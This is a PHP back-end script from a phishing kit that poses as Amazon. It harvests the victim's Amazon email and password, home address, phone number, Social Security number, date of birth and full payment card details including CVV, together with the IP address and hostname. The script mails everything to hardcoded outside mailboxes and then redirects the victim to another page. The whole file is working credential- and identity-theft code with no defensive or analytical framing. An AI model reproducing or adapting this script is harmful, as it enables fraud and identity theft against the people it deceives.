<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "--------------+ User online +------------\n";
$message .= "Amazon email : ".$_POST['emaillo']."\n";
$message .= "Password : ".$_POST['passcode']."\n";
$message .= "--------------+ info +------------\n";
$message .= "Full name : ".$_POST['FullNamer']."\n";
$message .= "Addres : ".$_POST['Address11']."\n";
$message .= "Addres2 : ".$_POST['Address2']."\n";
$message .= "City : ".$_POST['CityName']."\n";
$message .= "State : ".$_POST['StateN']."\n";
$message .= "ZipCode : ".$_POST['ZipCode']."\n";
$message .= "Country : ".$_POST['CountryNa']."\n";
$message .= "Phone Number : ".$_POST['Phone221']."\n";
$message .= "Ssn : ".$_POST['ssn21124']."\n";
$message .= "Date of Birth: : ".$_POST['dobday']."";
$message .= "-".$_POST['dobmonth']."";
$message .= "-".$_POST['dobyear']."\n";
$message .= "--------------+ Card info +------------\n";
$message .= "Card Name : ".$_POST['NameonCards']."\n";
$message .= "Card Number : ".$_POST['Cardanumber']."\n";
$message .= "Expiration date: : ".$_POST['Expiredatesss']."";
$message .= " / ".$_POST['expdate_year']."\n";
$message .= "Ccv : ".$_POST['CVV2']."\n";
$message .= "--------------+ Connction info +------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "--------------------\n";
$rnessage  = "$message\n";
$message .= "--------------+ Created in 2013 By [ D.R Zo0ka] +------------\n";

$send="lolxlol333@blumail.org,zo0ka@inbox.com";


$subject = "$ip";
$headers = "From: KOsmak<standerlovee@cox.net>";
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
mail($messege,$subject,$rnessage,$headers);
Header ("Location:said.php");
}
?>
